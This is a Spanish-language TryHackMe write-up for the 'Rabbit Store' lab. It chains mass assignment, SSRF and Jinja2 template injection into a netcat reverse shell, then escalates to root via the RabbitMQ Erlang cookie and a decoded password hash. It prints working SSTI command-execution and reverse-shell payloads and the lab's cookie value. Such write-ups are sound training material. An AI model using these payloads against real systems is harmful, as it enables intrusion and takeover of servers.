---
title: "Rabbit Store - THM | by ils00"
author: ils00
categories: [TryHackMe]
tags: [web, js, jwt, fuzzing, mass assignment, api, ssrf, ssti, rabbitmq, erlang]
render_with_liquid: false
media_subpath: /img_p/rabbit-store-thm
image:
  path: logo.webp
---



# Rabbit Store — CTF — WriteUP — THM | by Ian Lopez

Esta es una de las maneras de resolver la máquina **Rabbir Store** de **TryHackMe** con categoria **Media** en la plataforma.

![](https://miro.medium.com/v2/resize:fit:700/1*NwXFEQxPcrop1oj7JeSaag.png)

# **Conocimientos Previos:**

- Burp Suite
- Reconocimiento de máquinas Linux
- API
- Vulnerabilidad SSRF
- JWT Token

Después de saber todo esto, vamos a comenzar!!!

**** ESPERAR 5 MINUTOS ANTES DE EMPEZAR CON LOS ESCANEOS ****

Creamos una jerarquía de directorios para poder tenerlo todo organizado.

![](https://miro.medium.com/v2/resize:fit:436/1*XOF5TgywfnmOMStbEM_DrA.png)

4 directoritos de trabajo

# Escaneo de Puertos:

Primeramente, lanzamos una traza ICMP hacia la máquina víctima para ver si nos responde.

![](https://miro.medium.com/v2/resize:fit:875/1*0u5-aabb0D2TWdulu3xUlA.png)

Ping a la maquina

Una vez veamos que nos responde analizamos esta traza y podemos ver el TTL que es igual a **63** por lo tanto estamos ante una maquina **Linux**.

Lanzamos el primer comando de escaneo de **Nmap** que nos dará una vista de mas o menos a que nos estamos enfrentando.

![](https://miro.medium.com/v2/resize:fit:875/1*QoJEGog8HlovVOncM5pEYg.png)

Primer escaneo Nmap

`ping - p - --open    --min-rate    5000 -sS -vvv -Pn -n     [IP VÍCTIMA]`

Ahora que tenemos la visión realizaremos un escaneo más exhaustivo pero únicamente a los puertos abiertos para que no se demore mucho tiempo.

![](https://miro.medium.com/v2/resize:fit:875/1*Ec4sGfidy6VLBE6IXZMljw.png)

Escaneo exhaustivo

Podemos ver ahora mucha mas información de los puertos abiertos de la máquina.

Vamos a investigar todo sobre esos puertos.

    **Puerto 22** → Servicio SSH corriendo, y gracias a la versión de OpenSSH podemos     saber presuntamente que estamos ante un **Ubuntu Jammy**, luego lo     corroboraremos.

    **Puerto 80** → Vemos que tenemos un servidor web levantado, ahora le echamos un     ojo.

    **Puerto 4369** → Erlang port Mapper Daemon, este demonio actúa como un servidor     de nombres para los hosts involucrados en los cálculos distribuidos de Erlang.

## Servidores EPMD Accesibles (Informe del demonio de mapeo de puertos de Erlang accesible)

### Este informe identifica servidores Erlang Port Mapper Daemon (EPMD) accesibles en el puerto 4369/tcp. Este demonio…

[www.cert.gov.py]()

https://www.cert.gov.py/reportes-proactivos-de-ciberseguridad/scan_epmd/?source=post_page-----e4b1091e7339---------------------------------------)

    **Puerto 25672** → Unknown, no detecta el servicio que está corriendo. Podría ser     un falso positivo.

    Pero tiene relación con el puerto 4369 que hemos visto anteriormente.

# Análisis

Como hemos visto en el escaneo al parecer esta sobre el dominio → cloudsite.thm, por lo que hay meterlo en fichero **hosts**.

![](https://miro.medium.com/v2/resize:fit:653/1*LIwPMXmArJuFvGOyqpe6ug.png)

![](https://miro.medium.com/v2/resize:fit:875/1*H_zV7QhdarRGQFV0LaM4hw.png)

Ahora podemos ver la página web, vamos a analizarla para ver por donde podríamos empezar con la recolección de información.

En la parte del **Login** al entrar podemos ver que nos lleva al subdominio que es storage.cloudsite.thm, que tendremos que meterlo en el fichero **host.**

Visto que tenía subdominios decidí escanear con **gobuster** en busca de directorios ocultos.

![](https://miro.medium.com/v2/resize:fit:875/1*3_2y7YNZlEGi64KLAk6jLA.png)

Pero nada no saque nada en claro.

Por lo que intenté loguearme a ver si puedo acceder por lo menos al dashboard para ver como es por dentro.

![](https://miro.medium.com/v2/resize:fit:875/1*5K7btH0-nVJxcJuM70NINQ.png)

Pero me da un error, porque no tengo licencia.

![](https://miro.medium.com/v2/resize:fit:440/1*wtOB9BTL7lMAsYWw30DRZw.png)

Podemos ver que nos envía a un directorio que pone **inactive.**

![](https://miro.medium.com/v2/resize:fit:875/1*yYXcsLRLYeBm_XBFLkwL0A.png)

Analizamos un poco mas afondo y vemos que tenemos un **token JWT.**

Vamos a ver como esta hecho en jwt.io

![](https://miro.medium.com/v2/resize:fit:875/1*phJLo1XUcjYDQdN94KRV9A.png)

Podemos ver lo que **Inactive** que significa que no podemos acceder al dashboard.

# Primera parte de la intrusión

Lo que podemos hacer es interceptar la trama por **Burp Suite** del registro de un nuevo usuario.

![](https://miro.medium.com/v2/resize:fit:875/1*_6GKyGqIf8XK4wTFsBHItQ.png)

Eso es lo que nos da el email y la password, por lo que investigando un poco el mensaje de antes. Haya usuarios “activos” e “inactivos”. Por lo tanto, vamos a enviarle al servidor que este usuario es un usuario activo para que nos cree el token con cuenta activa.

![](https://miro.medium.com/v2/resize:fit:361/1*vvdVNJpEhPIfAIUTrQXh8w.png)

![](https://miro.medium.com/v2/resize:fit:875/1*DCc2F_Hfa-hl3RzkpQbhOA.png)

Lo pasamos por el **Repeater** y vemos que el usuario está creado correctamente.

Logueamos con el usuario que acabamos de crear:

![](https://miro.medium.com/v2/resize:fit:875/1*NctEPm78bQ_UmIvQoZ_eHA.png)

Tenemos una página para subida de archivo. Investiguemos!!

![](https://miro.medium.com/v2/resize:fit:669/1*ExvVqL4oqPA2ZnIbF15-uw.png)

Cuando subes algo se ve que renombra el fichero y lo mete en el directorio **/api/uploads.**

Veamos que hay despues del directorio **api**:

`gobuster dir -u [URL] -w [DICCIONARO] -t [HILOS] -c [COOKIE ACTIVADA]`

![](https://miro.medium.com/v2/resize:fit:858/1*Widfob4jjYlHmICbB8I4pA.png)

Aun poniendo la cookie activada nos manda un código de estado **403** que nos dice “Acceso no Autorizado”.

![](https://miro.medium.com/v2/resize:fit:723/1*y7VZgHIF6ukVyAnTaPv-sQ.png)

Vamos a probar como funciona la subida de archivos por URL. Me he creado un servidor con pyhton3 y me he descargado el archivo. Veamos como se comporta.

![](https://miro.medium.com/v2/resize:fit:494/1*3rSBOQgs2Qkr5-fEhU2NWA.png)

Envío esto desde la maquina victima

![](https://miro.medium.com/v2/resize:fit:875/1*fs34i89vzZNebFKtNmjGnA.png)

Respuesta OK

![](https://miro.medium.com/v2/resize:fit:491/1*OmJVzWtJxZqf8Zi_J9sLmQ.png)

Cuando subimos el archivo y actualizamos la pagina nos da este mensaje, si le damos click e interceptamos la trama con **Burp** podemos ver que el contenido es visible.

![](https://miro.medium.com/v2/resize:fit:875/1*ZyzLS-CnLWf5IqWDirNU_w.png)

Ahora con estos datos sabemos que es vulnerable a **SSRF (Server-Side Request Forgery)** que es un tipo de vulnerabilidad en la cual nos vamos a manipular la API y la web para realizar peticiones a recursos internos a los cuales no tenemos acceso.

# Segunda Parte de la Intrusión (SSRF)

Vamos a hacerle una petición al punto final de la API. Investigando un poco me doy cuenta de que esta utilizando el framework **Express**.

![](https://miro.medium.com/v2/resize:fit:216/1*owmZlfOgemHO_A7X9n1FxA.png)

Este framework trabaja en el puerto **3000**, por lo que la petición irá por ese puerto.

![](https://miro.medium.com/v2/resize:fit:875/1*QtYfGHk75VBVy0NN9LigbA.png)

![](https://miro.medium.com/v2/resize:fit:539/1*2saCLfM2T4E11Uy8v3xyIw.png)

Esta sería la petición que haríamos. Y el resultado lo podemos descargar y leer en nuestra máquina.

![](https://miro.medium.com/v2/resize:fit:875/1*pJsl0CjWXYgBASFUAvp_QA.png)

Mensaje oculto

Podemos ver que hay una parte que no nos ha salido antes en el escaneo de directorios con **Gobuser**. Veamos que tiene.

![](https://miro.medium.com/v2/resize:fit:875/1*1bUq3ss4HjyBzoaVZp3Zqw.png)

Nos dice que el método no es correcto, pues cambiamos de **GET** a **POST**. Pero eso no es suficiente investigando un poco di con la clave que es enviar una cadena de JSON vacía para ver como reaccionaba y BINGO!!

![](https://miro.medium.com/v2/resize:fit:875/1*Yjngsm6U-gjw1GUeN5UG-w.png)

Ahora me pide unos parámetros de usuario.

![](https://miro.medium.com/v2/resize:fit:875/1*SIMamy9sD6Ze90cvt_uhwA.png)

Vemos que se refleja respeta, entonces vamos a investigar porque es posible que podamos conseguir acceso a la máquina.

l introducir este payload podemos ver información relevante de que tecnología se está usando por detrás.

**{{<%[%'}}%\\.**

![](https://miro.medium.com/v2/resize:fit:875/1*Vi9LOyxVMNGLGSHwCLNSmQ.png)

Vemos que esta utilizando el motor de plantillas **Jinja2**, por lo tanto ahora podemos dirigir mejor el ataque.

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

He utilizando esta comando para poder sacar el la información de la **id** de la máquina y BINGOO!

![](https://miro.medium.com/v2/resize:fit:735/1*X1GYk_D3tRrPNu4OJVe90w.png)

Nos da la información, entonces es momento de entablar una conexión mediante una **reverse shell**.

`{"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc [IP LOCAL] [PUERTO ESCUCHA]>/tmp/f').read() }}"}`

![](https://miro.medium.com/v2/resize:fit:875/1*RI7G-yX4QoiZl30jof0-yg.png)

Estamos dentro de la máquina.

# Escalada de Privilegios

Primeramente, tenemos la flag de usuario.

![](https://miro.medium.com/v2/resize:fit:436/1*NwtgS4VOKi4HJepdOEgMlQ.png)

Seguidamente investigando un poco si recordamos teníamos el servicio de las cookies de **Erlang**, que se ubican en esta ruta:

/var/lib/rabbitmq/.erlang.cookie

Le hacemos un **less** y así podemos ver el contenido mucho mejor.

![](https://miro.medium.com/v2/resize:fit:554/1*7RmgVkcPXNDmsYDAuSJ6Ng.png)

Debido a los escaneos realizados anteriormente, sabemos que el nodo **RabbitMQ** se está ejecutando en el servidor:

![](https://miro.medium.com/v2/resize:fit:833/1*eX3MQeejLsDa_5w4ACoosw.png)

Con la cookie de **Erlang**, podemos autenticarnos y comunicarnos con el nodo **RabbitMQ**. Habrá que añadir **forge** en el fichero host.

Ahora, usaremos la herramienta **rabbitmqctl** encontrada para enumerar la instancia **RabbitMQ.**

`sudo rabbitmqctl --erlang-cookie 'iUucRMxsu4kXj85M' --node rabbit@forge status`

![](https://miro.medium.com/v2/resize:fit:875/1*IgiaXbm0AL4cpTr4YxYR0Q.png)

`sudo rabbitmqctl --erlang-cookie 'iUucRMxsu4kXj85M' --node rabbit@forge list_users`

![](https://miro.medium.com/v2/resize:fit:875/1*24DrR3WaDmpvLvh--ORQLA.png)

Investigamos y con el comando **export_definitions** podemos recuperar el hash de a contraseña de root.

![](https://miro.medium.com/v2/resize:fit:875/1*Nm4AYGd_qCmWktp4Yb7sRw.png)

Si leemos el fichero salen muchas palabras pero si nos fijamos…

![](https://miro.medium.com/v2/resize:fit:875/1*u0lBhHI20Cb-lQcTtVELsA.png)

Ahí tenemos el hash. Lo tratamos y lo invertimos para intentar sacar la contraseña de root. Información en los manuales:

https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm

`echo -n "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF" | base64 -d | xxd -p -c 100`

Nos da este resultado → e3d7ba85295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585

Eliminamos los 4 bytes de sal ( **295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585** )

Entonces probamos como contraseña Y…

![](https://miro.medium.com/v2/resize:fit:381/1*JVCcao75jyY4JLMIjosnEQ.png)

Somos ROOT!!

# Conclusión

Es una máquina de nivel medio la cual necesita de bastante conocimiento y de muchas horas de dedicación por parte de la investigación final yo he tardado en resolverla un total de **7h** aproximadamente, CON AYUDA.

Un saludo, GOOD HACKING!!!!

~~XIII~~
